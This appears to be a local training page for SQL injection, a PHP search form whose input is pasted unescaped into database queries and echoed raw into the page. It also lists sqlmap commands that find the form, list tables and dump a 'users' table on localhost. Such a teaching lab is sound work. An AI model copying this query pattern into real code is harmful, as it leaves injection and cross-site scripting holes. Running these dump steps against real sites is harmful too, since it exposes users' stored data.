<?php
require_once(dirname($_SERVER['DOCUMENT_ROOT']) . "/vendor/autoload.php");

/**
 * @var \PDO $connector
 */
$connector = new My\DB("myTestDb");

if (isset($_POST['search'])) {
    $connector->getConnector()->query("INSERT INTO `searches` SET `searchkey` = '" . $_POST['search'] . "', `date` = '" . date("Y-m-d H:i:s") . "'");
    $result = $connector->getConnector()->query("SELECT `date` FROM `searches` WHERE `searchkey` = '" . $_POST['search'] . "' ORDER BY `date` DESC LIMIT 1");
}

?>
<style>
    i {
        font-family: 'DeJaVu Sans Mono';
    }
</style>
<h1>My search App</h1>
<form method="post">
    <input type="text" name="search" style="width: 100%" placeholder="Search..." />
    <input type="submit" name="submitBtn" value="Search" />
</form>

<?php if (isset($_POST['search'])): ?>
    <hr />
    Last search on this term (<?= $_POST['search'] ?>) was <?= $result->fetchAll()[0]['date'] ?>

<?php endif; ?>
<hr />
SQLMap Steps
<ol>
    <li>Scan for vulnerable forms <i>./sqlmap.py -u http://localhost:666/sqlmap/example1.php --forms --batch --flush-session</i></li>
    <li>List all tables <i>./sqlmap.py -u http://localhost:666/sqlmap/example1.php --forms --tables --batch --flush-session</i></li>
    <li>Get table entries from users <i>./sqlmap.py -u http://localhost:666/sqlmap/example1.php --forms -D myTestDb -T users --dump --batch --flush-session</i></li>
</ol>

<?php include('index.php');?>